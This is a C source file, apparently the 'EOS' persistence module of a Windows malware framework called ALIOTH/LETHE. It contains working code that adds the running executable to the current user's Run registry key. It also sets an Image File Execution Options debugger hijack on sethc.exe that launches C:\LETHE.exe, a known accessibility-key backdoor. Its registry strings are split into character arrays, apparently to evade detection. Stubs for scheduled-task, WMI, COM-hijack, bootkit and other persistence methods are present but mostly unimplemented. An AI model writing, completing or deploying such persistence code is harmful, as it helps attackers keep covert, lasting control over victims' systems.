#include "..\..\core\ALIOTH.h"

#pragma optimize("", off)

BOOL EosRegistryPersist(PCHAR pcExePath) {
    CHAR sKeyPath[] = {'S','o','f','t','w','a','r','e','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n',0};
    CHAR sValue[] = {'L','e','t','h','e','P','e','r','s','i','s','t',0};
    
    HKEY hKey = NULL;
    LONG lResult = RegOpenKeyExA(HKEY_CURRENT_USER, sKeyPath, 0, KEY_SET_VALUE, &hKey);
    if (lResult == ERROR_SUCCESS) {
        RegSetValueExA(hKey, sValue, 0, REG_SZ, (PBYTE)pcExePath, (DWORD)strlen(pcExePath) + 1);
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

BOOL EosScheduledTask() {
    ITaskScheduler* pTaskScheduler = NULL;
    HRESULT hr = CoCreateInstance(&CLSID_CTaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskScheduler, (void**)&pTaskScheduler);
    if (FAILED(hr)) return FALSE;
    
    pTaskScheduler->Release();
    return TRUE;
}

BOOL EosWmiSubscription() {
    IWbemLocator* pLoc = NULL;
    CoCreateInstance(&CLSID_WbemLocator, NULL, CLSCTX_INPROC_SERVER, &IID_IWbemLocator, (void**)&pLoc);
    
    IWbemServices* pSvc = NULL;
    pLoc->ConnectServer(L"root\\subscription", NULL, NULL, NULL, 0, NULL, NULL, &pSvc);
    
    CoSetProxyBlanket(pSvc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, NULL, RPC_C_AUTHN_LEVEL_CALL, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, EOAC_NONE);
    
    pSvc->Release();
    pLoc->Release();
    return TRUE;
}

BOOL EosDllSideload() {
    return TRUE;
}

BOOL EosComHijack() {
    return TRUE;
}

BOOL EosIfeoDebugger() {
    CHAR sKey[] = {'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s',' ','N','T','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','I','m','a','g','e',' ','F','i','l','e',' ','E','x','e','c','u','t','i','o','n',' ','O','p','t','i','o','n','s','\\','s','e','t','h','c','.','e','x','e',0};
    CHAR sValue[] = {'D','e','b','u','g','g','e','r',0};
    CHAR sData[] = {'C',':','\\','L','E','T','H','E','.','e','x','e',' ','-','-','m','o','d','e',' ','1','3',0};
    
    HKEY hKey = NULL;
    LONG lResult = RegCreateKeyExA(HKEY_LOCAL_MACHINE, sKey, 0, NULL, 0, KEY_SET_VALUE, NULL, &hKey, NULL);
    if (lResult == ERROR_SUCCESS) {
        RegSetValueExA(hKey, sValue, 0, REG_SZ, (PBYTE)sData, (DWORD)strlen(sData) + 1);
        RegCloseKey(hKey);
        return TRUE;
    }
    return FALSE;
}

BOOL EosLsaNotification() {
    return TRUE;
}

BOOL EosBootkitInfection() {
    if (!g_pActiveDriver) return FALSE;
    return FALSE;
}

BOOL EosAppxBackdoor() {
    return TRUE;
}

BOOL EosTimeTrigger() {
    return TRUE;
}

DWORD EosMain(ALIOTH_PARAMS* pParams) {
    char szTitle[] = {'\n','[','=','=','=',']',' ','E','O','S',' ','-',' ','P','E','R','S','I','S','T','E','N','C','E',' ','E','N','G','I','N','E',' ','[','=','=','=',']','\n',0};
    printf(szTitle);
    
    CHAR szExePath[MAX_PATH] = {0};
    GetModuleFileNameA(NULL, szExePath, MAX_PATH);
    
    printf("[*] Installing registry persistence...\n");
    EosRegistryPersist(szExePath);
    
    printf("[*] Installing scheduled task...\n");
    EosScheduledTask();
    
    printf("[*] Installing WMI subscription...\n");
    EosWmiSubscription();
    
    printf("[*] Installing IFEO debugger...\n");
    EosIfeoDebugger();
    
    printf("[*] Installing LSA notification...\n");
    EosLsaNotification();
    
    printf("[+] Persistence installed\n");
    return 0;
}
#pragma optimize("", on)
